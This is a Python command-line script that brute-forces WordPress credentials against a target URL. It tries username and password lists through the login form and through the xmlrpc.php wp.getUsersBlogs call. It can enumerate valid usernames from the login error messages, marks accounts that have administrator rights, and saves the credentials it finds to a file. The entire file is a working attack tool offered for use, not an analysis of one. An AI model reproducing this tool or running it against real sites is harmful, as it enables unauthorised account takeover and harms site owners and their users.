#!/usr/bin/python3
import requests
import argparse, sys
import xml.etree.ElementTree as ET

V_CREDS = [] # includes username:password and whether the user has admin rights
SESSION = requests.session()
HEADER = {'Content-Type': 'application/x-www-form-urlencoded'} # for xmlrpc and login from

def write_file(f_name, liste):
    '''
    writes the credentials to a file.
    '''
    file = f'{f_name}_{str(len(liste))}.lst'
    with open(file, 'w') as f:
        for item in liste:
            f.write(item.strip()+'\n')
        f.close()

def login_post_request(username, password):
    '''
    Send post request to login page, with username and password
    ''' 
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {
        'log':username,
        'pwd':password,
        'wp-submit':'Login In'
    }
    try:
        r = SESSION.post(args.url+'/wp-login.php', headers=header, data=data, timeout=10, verify=False)
        return r
    except requests.exceptions.RequestException as e:
        print(f'Login Post Request Failed: {e}')
        exit(-1)

def xmlrpc_post_request(username, password):
    '''
    Send post request to xmlrpc api, with username and password
    ''' 
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = f'<methodCall> \r\n<methodName>wp.getUsersBlogs</methodName> \r\n<params> \r\n<param><value>{username}</value></param> \r\n<param><value>{password}</value></param> \r\n</params> \r\n</methodCall>'
    try:
        r = SESSION.post(args.url+'/xmlrpc.php', headers=header, data=data, timeout=10, verify=False)
        return r
    except requests.exceptions.RequestException as e:
        print(f'Xmlrpc Post Request Failed: {e}')
        exit(-1)

def xmlrpc_api(u_list, p_list):
    '''
    Starts brute force via xmlrpc.
    The output of the request indicates whether a user has admin rights or not
    '''
    global V_CREDS
    
    try:
        # check if xmlrpc URL is correct
        if xmlrpc_post_request('x','x').status_code != 200:
            print('\t- XMLRPC services not reachable')
            exit(-1)
        for u_index, username in enumerate(u_list, start=1):
            username = username.replace('\n','')
            for p_index, password in enumerate(p_list, start=1):
                # Consolen Output, same line
                sys.stdout.write(f'\r\t - Username[%{len(str(u_len))}s/{u_len}]: %{uname_len}s - Password[%{len(str(p_len))}s/{p_len}] %{pname_len}s'% (u_index, username.strip(), p_index, password.strip()))
                sys.stdout.flush()
                r = xmlrpc_post_request(username, password)
                msg = f'{username} : {password}'.replace('\n','')
                # Check valid credentials
                if 'Incorrect username or password.' not in r.text:
                    # Check isAdmin
                    tree = ET.ElementTree(ET.fromstring(r.content))
                    root = tree.getroot()
                    role = [elem.text for elem in root.iter('boolean')][0]
                    isadmin = ''
                    if int(role) == 1:
                        isadmin += ' - is Administrator'
                    print(f' <= Valid {isadmin}')
                    V_CREDS.append(msg+isadmin)
                    break # try next username
            print()
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f'[#] Brute Force via Xmlrpc  Failed : {e}')
        exit(-1)

def login_form(u_list, p_list):
    '''
    Starts brute force via login form.
    If plugins.php is in the output of the request, the user has admin rights
    '''
    global V_CREDS
    try:
        # check if login URL is correct
        if login_post_request('x','x').status_code != 200:
            print('\t- Login Page incorrect')   
            exit(-1)
        for u_index, username in enumerate(u_list, start=1):
            username = username.replace('\n','')
            for p_index, password in enumerate(p_list, start=1):
                # Consolen Output, same line
                sys.stdout.write(f'\r\t - Username[%{len(str(u_len))}s/{u_len}]: %{uname_len}s - Password[%{len(str(p_len))}s/{p_len}] %{pname_len}s'% (u_index, username.strip(), p_index, password.strip()))
                sys.stdout.flush()     
                r = login_post_request(username, password)
                msg = f'{username} : {password}'.replace('\n','')
                # Check valid credentials
                if 'dashboard' in r.text:
                    # Check isAdmin
                    isadmin = ''
                    if 'plugins.php' in r.text:
                        isadmin = ' - is Administrator'
                    print(f' <= Valid {isadmin}')
                    V_CREDS.append(msg+isadmin)
                    break # try next username
            print()
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f'Brute Force via Login Page Failed : {e}')
        exit(-1)
    
def validated_user(u_list):
    '''
    Try to login with given username and fix password, to check the login error.
    The login error tells you whether a user is registered on the system or not.
    Brute force can then be started with this information.
    If there are no valid usernames, then the script exits.
    '''
    val_user = [] # includes all valid usernames
    if login_post_request('x','x').status_code != 200:
            print('\t- Login Page incorrect')   
            exit(-1)
    for username in u_list:
        username = username.replace('\n','')
        r = login_post_request(username,'x')
        if 'The password you entered for the username' in r.text:
            val_user.append(username) # add valide username
            print(f'\t- {username}')
    # No valid username found
    if not val_user:
        print("[!] No valid usernames could be found, two reasons why:")
        print("\t1. All usernames that you have specified are not valid")
        print("\t2. This WordPress have no Username Enumeration Vulnerability")
        exit()
    return val_user
    
def main(u_list, p_list):
    global p_len, u_len, uname_len, pname_len
    print("\n| Start Brute Force Script")
    if args.validated:
        print('[#] Use validation: Login Error')
        u_list = validated_user(u_list)
    # set lentgth of given lists and longest word in lists for formatted output
    p_len = len(p_list)
    u_len = len(u_list)
    uname_len = len(max(u_list, key=len))
    pname_len = len(max(p_list, key=len))  
    print(f'[?] Load {u_len} Usernames and {p_len} Passwords')
    # Methode: xmlrpc
    if ('x' or 'xmlrpc') in args.methode:
        print('[#] Use Methode: xmlrpc.php')
        xmlrpc_api(u_list, p_list)
    # Methode: Login Form
    else:
        print('[#] Use Methode: Loging Form')
        login_form(u_list, p_list)
    # check if credentials were found
    if len(V_CREDS):
        print('\n| Findings:')
        write_file(args.output, V_CREDS)
        for creds in V_CREDS:
            print(f'\t- {creds}')
    else:
        print('\n| No Valid Credentials found')
    print('\n| End')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Brute Force Script, find valid login credentials from username or password (-list)')
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_password = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str, help='Target WordPress Url')
    group_user.add_argument('-u', '--userlist', nargs='+', default=[], type=str, help='One or more list with usernames')
    group_user.add_argument('-U', '--user', nargs='+', default=[], type=str, help='Individual usernames')
    group_password.add_argument('-p', '--passwordlist', nargs='+', default=[], type=str, help='One or more list with passwords')
    group_password.add_argument('-P', '--password', nargs='+', default=[], type=str, help='Individual passwords')
    parser.add_argument('-m', '--methode', choices=['x','xmlrpc','l','loginForm'], type=str, default='loginForm', help='Choose brute force methode: x=xmlrpc or l=loginForm (Default: loginForm)')
    parser.add_argument('-o', '--output', nargs='?', default='find_creds.out', help='Output filename for found credentials (Default: find_creds.out)')
    parser.add_argument('-v', '--validated', action='store_true', default=False, help='Validate username via Login Error')
    args = parser.parse_args()
    args.url = args.url.rstrip('/')
    # read all given username and password list
    u_list = args.user # list with usernames
    for user_list in args.userlist:
        f = open(user_list,"r")
        u_list += f.readlines()
    p_list = args.password # list with passwords
    for pw_list in args.passwordlist:
        if args.passwordlist:
            f = open(pw_list,"r")
            p_list += f.readlines()
    main(u_list, p_list)
